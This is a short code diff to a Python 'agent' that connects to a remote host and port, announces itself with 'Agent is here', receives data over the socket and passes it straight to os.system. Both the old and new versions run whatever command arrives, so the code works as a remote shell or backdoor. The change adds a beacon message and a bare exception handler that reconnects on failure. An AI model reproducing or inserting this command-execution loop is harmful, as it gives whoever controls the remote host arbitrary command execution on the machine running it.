@@ -23,12 +23,15 @@ def connect_agent():
     LOG.info('Connecting to {} port {}.'.format(str(HOST), str(PORT)))
     sock.connect(addr)
     while True:
-        data = sock.recv(1024)
-        if not data:
+        try:
+            sock.send('Agent is here')
+            data = sock.recv(1024)
+            if not data:
+                continue
+            LOG.info('Received {}'.format(data))
+            os.system(data)
+        except:
             reconnect_agent()
-            continue
-        LOG.info('Received {}'.format(data))
-        os.system(data)
 
 
 def reconnect_agent():
